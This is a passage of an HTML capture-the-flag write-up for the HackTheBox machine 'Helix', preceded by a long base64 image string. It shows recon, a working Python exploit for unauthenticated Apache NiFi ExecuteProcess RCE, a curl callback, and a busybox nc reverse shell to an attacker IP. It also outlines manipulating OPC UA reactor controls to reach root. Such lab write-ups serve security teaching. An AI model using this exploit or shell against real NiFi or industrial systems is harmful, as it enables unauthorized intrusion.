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" alt="Helix" style="width:160px;height:160px;object-fit:contain;border-radius:50%"></div>
+  <div class="hero-badge">HackTheBox &mdash; Machine Writeup</div>
+  <h1 class="hero-title">HE<span>LIX</span></h1>
+  <p class="hero-sub">// MEDIUM &middot; LINUX &middot; APACHE NIFI RCE &middot; ICS &middot; OPC UA REACTOR CONTROL</p>
+  <div class="hero-meta">
+    <div class="hero-meta-item">
+      <span class="hero-meta-label">Difficulty</span>
+      <span class="difficulty-badge">MEDIUM</span>
+    </div>
+    <div class="hero-meta-item">
+      <span class="hero-meta-label">OS</span>
+      <span class="hero-meta-value">Ubuntu Linux</span>
+    </div>
+    <div class="hero-meta-item">
+      <span class="hero-meta-label">IP</span>
+      <span class="hero-meta-value">10.129.173.78</span>
+    </div>
+    <div class="hero-meta-item">
+      <span class="hero-meta-label">Vhosts</span>
+      <span class="hero-meta-value">helix.htb &middot; flow.helix.htb</span>
+    </div>
+    <div class="hero-meta-item">
+      <span class="hero-meta-label">Attack Surface</span>
+      <span class="hero-meta-value">NiFi API &middot; SSH Key &middot; PDF/Stego &middot; OPC UA</span>
+    </div>
+  </div>
+  <div class="scroll-hint"><span>SCROLL</span><div class="scroll-arrow"></div></div>
+</div>
+
+<!-- SECTION 01 OVERVIEW -->
+<section id="overview">
+  <div class="wrapper">
+    <div class="section-label">// 01</div>
+    <h2 class="section-title">Machine <span class="accent">Overview</span></h2>
+    <p style="color:var(--text);font-size:.98rem;max-width:800px;margin-bottom:2.5rem;line-height:1.8">Helix presents a nearly invisible external attack surface — a fully static website with no dynamic endpoints. Subdomain discovery reveals an Apache NiFi 1.21.0 instance with anonymous access enabled, providing unauthenticated RCE via the ExecuteProcess processor API. Post-exploitation recovers an SSH private key from NiFi's support-bundles directory. As <code style="color:var(--cyan);font-family:var(--mono)">operator</code>, a password-protected PDF and a steganographic PNG together reveal an OPC UA-based industrial reactor control architecture. Manipulating the reactor's OPC UA nodes triggers the safety controller to authorize a maintenance window — enabling a <code style="color:var(--cyan);font-family:var(--mono)">sudo</code>-privileged script that spawns a root shell.</p>
+
+    <div class="callout info">
+      <div class="callout-icon">&#9672;</div>
+      <div class="callout-text"><strong>Full Attack Chain:</strong> Vhost discovery &rarr; NiFi 1.21.0 anonymous access &rarr; ExecuteProcess RCE &rarr; nifi shell &rarr; operator SSH key from support-bundles &rarr; user flag &rarr; PDF cracked (operator1) &rarr; PNG stego reveals OPC UA nodes &rarr; SSH tunnel :4840 &rarr; manipulate reactor (MAINTENANCE mode + CalibrationOffset=11.0 &rarr; 295&deg;C) &rarr; safety controller writes maintenance_window file &rarr; sudo helix-maint-console &rarr; root.</div>
+    </div>
+
+    <div class="divider"><div class="divider-line"></div><div class="divider-text">attack chain</div><div class="divider-line"></div></div>
+    <div class="cred-chain">
+      <span class="cred-node">NiFi anon access</span><span class="cred-arrow">&rarr;</span>
+      <span class="cred-node">ExecuteProcess RCE</span><span class="cred-arrow">&rarr;</span>
+      <span class="cred-node">nifi shell</span><span class="cred-arrow">&rarr;</span>
+      <span class="cred-node">operator SSH key</span><span class="cred-arrow">&rarr;</span>
+      <span class="cred-node">PDF cracked &rarr; OPC UA map</span><span class="cred-arrow">&rarr;</span>
+      <span class="cred-node">Reactor manipulation</span><span class="cred-arrow">&rarr;</span>
+      <span class="cred-node">maintenance_window &rarr; ROOT</span>
+    </div>
+
+    <table class="target-table">
+      <thead><tr><th>Field</th><th>Value</th></tr></thead>
+      <tbody>
+        <tr><td>Target IP</td><td>10.129.173.78</td></tr>
+        <tr><td>OS</td><td>Ubuntu Linux</td></tr>
+        <tr><td>Open Ports</td><td>22 (SSH) &middot; 80 (nginx)</td></tr>
+        <tr><td>Vhosts</td><td>helix.htb (static) &middot; flow.helix.htb (NiFi 1.21.0)</td></tr>
+        <tr><td>Internal Service</td><td>OPC UA opc.tcp://127.0.0.1:4840/helix/</td></tr>
+        <tr><td>Initial Shell</td><td>nifi (uid=998)</td></tr>
+        <tr><td>User</td><td>operator (SSH key from /opt/nifi-1.21.0/support-bundles/)</td></tr>
+        <tr><td>PDF Password</td><td>operator1 (cracked via John + rockyou.txt)</td></tr>
+        <tr><td>OPC UA Target Temp</td><td>295&deg;C (CalibrationOffset=11.0 + MAINTENANCE mode)</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- SECTION 02 RECON -->
+<section id="recon">
+  <div class="wrapper">
+    <div class="section-label">// 02</div>
+    <h2 class="section-title">Recon &amp; <span class="accent">Enumeration</span></h2>
+    <div class="phases">
+
+      <div class="phase">
+        <div class="phase-num">01</div>
+        <div class="phase-content">
+          <div class="phase-title">Nmap &mdash; Two Open Ports</div>
+          <div class="phase-subtitle">Reconnaissance &middot; Phase 01</div>
+          <p class="phase-desc">Full TCP scan reveals only two open ports — SSH and HTTP. No other services are externally exposed. All application services run internally, making vhost enumeration the critical next step.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash</div></div>
+            <pre><span class="cmd">nmap</span> <span class="param">-sC -sV -p-</span> <span class="flag">10.129.173.78</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">output</div></div>
+            <pre><span class="out">22/tcp  open  ssh   </span><span class="flag">OpenSSH 8.9p1 Ubuntu</span>
+<span class="out">80/tcp  open  http  </span><span class="flag">nginx 1.18.0 (Ubuntu)</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; /etc/hosts</div></div>
+            <pre><span class="cmd">echo</span> <span class="str">"10.129.173.78 helix.htb flow.helix.htb"</span> | <span class="cmd">sudo tee -a</span> /etc/hosts</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="phase">
+        <div class="phase-num">02</div>
+        <div class="phase-content">
+          <div class="phase-title">Web &amp; Vhost Enumeration</div>
+          <div class="phase-subtitle">Reconnaissance &middot; Phase 02</div>
+          <p class="phase-desc">The main site at <code style="color:var(--cyan);font-family:var(--mono)">helix.htb</code> is a completely static page — no forms, no API, no hidden files. Directory brute-forcing returns only <code style="color:var(--cyan);font-family:var(--mono)">index.html</code>. The key finding: manually testing <code style="color:var(--cyan);font-family:var(--mono)">flow.helix.htb/nifi/</code> returns a 500 (backend alive), and <code style="color:var(--cyan);font-family:var(--mono)">/nifi-api/</code> returns 200 with valid JSON — confirming Apache NiFi is running on the backend.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; probe vhost for NiFi</div></div>
+            <pre><span class="cmd">curl</span> <span class="param">-sI -H</span> <span class="str">"Host: flow.helix.htb"</span> http://10.129.173.78/nifi/
+<span class="out">HTTP/1.1 500 Server Error</span>  <span class="cmt">&larr; backend alive (JasperException / disk full)</span>
+
+<span class="cmd">curl</span> <span class="param">-sI -H</span> <span class="str">"Host: flow.helix.htb"</span> http://10.129.173.78/nifi-api/
+<span class="out">HTTP/1.1 200 OK</span>
+<span class="cmd">whatweb</span> http://flow.helix.htb/nifi/
+<span class="out">PoweredBy[Jetty://]</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; confirm NiFi version + anonymous access</div></div>
+            <pre><span class="cmd">curl</span> <span class="param">-s</span> http://flow.helix.htb/nifi-api/access/config
+<span class="out">{</span><span class="str">"config"</span><span class="out">:{</span><span class="str">"supportsLogin"</span><span class="out">:</span><span class="flag">false</span><span class="out">}}</span>  <span class="cmt">&larr; anonymous access enabled</span>
+
+<span class="cmd">curl</span> <span class="param">-s</span> http://flow.helix.htb/nifi-api/system-diagnostics | python3 <span class="param">-m</span> json.tool
+<span class="out">niFiVersion: </span><span class="flag">"1.21.0"</span></pre>
+          </div>
+          <div class="callout danger">
+            <div class="callout-icon">&#10005;</div>
+            <div class="callout-text"><strong>Critical Finding:</strong> Apache NiFi 1.21.0 with <code style="font-family:var(--mono)">supportsLogin: false</code> means anonymous access is fully enabled. Any API operation — including creating and running processors — requires zero authentication.</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 03 NIFI RCE -->
+<section id="nifi">
+  <div class="wrapper">
+    <div class="section-label">// 03</div>
+    <h2 class="section-title">Apache NiFi &mdash; <span class="accent">Unauthenticated RCE</span></h2>
+    <div class="phases">
+
+      <div class="phase">
+        <div class="phase-num">03</div>
+        <div class="phase-content">
+          <div class="phase-title">ExecuteProcess Processor Exploit</div>
+          <div class="phase-subtitle">NiFi RCE &middot; Phase 03</div>
+          <p class="phase-desc">The NiFi REST API allows creating <code style="color:var(--cyan);font-family:var(--mono)">ExecuteProcess</code> processors that run arbitrary OS commands. The exploit flow: fetch the root process group ID &rarr; create an ExecuteProcess processor &rarr; configure command + arguments &rarr; set state to <code style="color:var(--cyan);font-family:var(--mono)">RUNNING</code>. An HTTP callback to a Kali listener confirms RCE before deploying a reverse shell.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">python3 &mdash; nifi_rce.py (core logic)</div></div>
+            <pre><span class="kw">import</span> sys, json, requests <span class="kw">as</span> req
+
+<span class="kw">class</span> <span class="cmd">NiFiRCE</span>:
+    <span class="kw">def</span> <span class="cmd">__init__</span>(self, url):
+        self.url = url
+
+    <span class="kw">def</span> <span class="cmd">get_root_group</span>(self):
+        r = req.get(self.url + <span class="str">"/nifi-api/process-groups/root"</span>, verify=<span class="kw">False</span>)
+        <span class="kw">return</span> r.json()[<span class="str">"id"</span>]
+
+    <span class="kw">def</span> <span class="cmd">create_processor</span>(self, group_id):
+        url = self.url + <span class="str">f"/nifi-api/process-groups/{group_id}/processors"</span>
+        data = {
+            <span class="str">'component'</span>: {<span class="str">'type'</span>: <span class="str">'org.apache.nifi.processors.standard.ExecuteProcess'</span>},
+            <span class="str">'revision'</span>: {<span class="str">'version'</span>: 0}
+        }
+        r = req.post(url, json=data, verify=<span class="kw">False</span>)
+        <span class="kw">return</span> r.json()[<span class="str">"id"</span>]
+
+    <span class="kw">def</span> <span class="cmd">run_cmd</span>(self, proc_id, cmd):
+        parts = cmd.split(<span class="str">" "</span>, 1)
+        data = {
+            <span class="str">'component'</span>: {
+                <span class="str">'id'</span>: proc_id, <span class="str">'state'</span>: <span class="str">'RUNNING'</span>,
+                <span class="str">'config'</span>: {
+                    <span class="str">'autoTerminatedRelationships'</span>: [<span class="str">'success'</span>],
+                    <span class="str">'schedulingPeriod'</span>: <span class="str">'3600 sec'</span>,
+                    <span class="str">'properties'</span>: {
+                        <span class="str">'Command'</span>: parts[0],
+                        <span class="str">'Command Arguments'</span>: parts[1] <span class="kw">if</span> len(parts) &gt; 1 <span class="kw">else</span> <span class="str">''</span>
+                    }
+                }
+            },
+            <span class="str">'revision'</span>: {<span class="str">'clientId'</span>: <span class="str">'x'</span>, <span class="str">'version'</span>: 1}
+        }
+        req.put(self.url + <span class="str">f"/nifi-api/processors/{proc_id}"</span>, json=data, verify=<span class="kw">False</span>)
+
+    <span class="kw">def</span> <span class="cmd">exploit</span>(self, cmd):
+        gid = self.get_root_group()
+        pid = self.create_processor(gid)
+        self.run_cmd(pid, cmd)
+        <span class="cmd">print</span>(<span class="str">f"[+] Processor {pid} running: {cmd}"</span>)</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; verify RCE via HTTP callback</div></div>
+            <pre><span class="cmt"># Kali listener</span>
+<span class="cmd">python3 -m http.server</span> 80 &amp;
+
+<span class="cmt"># Trigger callback</span>
+<span class="cmd">python3</span> nifi_rce.py http://flow.helix.htb <span class="str">"curl http://10.10.14.24/rce-test"</span>
+<span class="out">10.129.173.78 - - [11/May/2026] "GET /rce-test HTTP/1.1" 200 -</span>
+<span class="cmt">&larr; RCE confirmed</span></pre>
+          </div>
+          <div class="callout success">
+            <div class="callout-icon">&#10003;</div>
+            <div class="callout-text"><strong>RCE Confirmed:</strong> The target fetched our callback URL — full unauthenticated OS command execution as the <code style="font-family:var(--mono)">nifi</code> service user.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="phase">
+        <div class="phase-num">04</div>
+        <div class="phase-content">
+          <div class="phase-title">Reverse Shell via busybox nc</div>
+          <div class="phase-subtitle">NiFi RCE &middot; Phase 04</div>
+          <p class="phase-desc">The target's <code style="color:var(--cyan);font-family:var(--mono)">busybox</code> binary includes <code style="color:var(--cyan);font-family:var(--mono)">nc</code> with <code style="color:var(--cyan);font-family:var(--mono)">-e</code> support, enabling a direct reverse shell without staging additional binaries.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; start listener + trigger shell</div></div>
+            <pre><span class="cmd">nc</span> <span class="param">-nlvp</span> 6666 &amp;
+
+<span class="cmd">python3</span> nifi_rce_noclean.py http://flow.helix.htb \
+  <span class="str">"busybox nc 10.10.14.24 6666 -e /bin/sh"</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">output</div></div>
+            <pre><span class="out">connect to [10.10.14.24] from [10.129.173.78]
+$ </span><span class="cmd">id</span>
+<span class="flag">uid=998(nifi) gid=998(nifi) groups=998(nifi)</span>
+<span class="out">$ </span><span class="cmd">hostname</span>
+<span class="out">helix</span></pre>
+          </div>
+          <div class="callout success">
+            <div class="callout-icon">&#10003;</div>
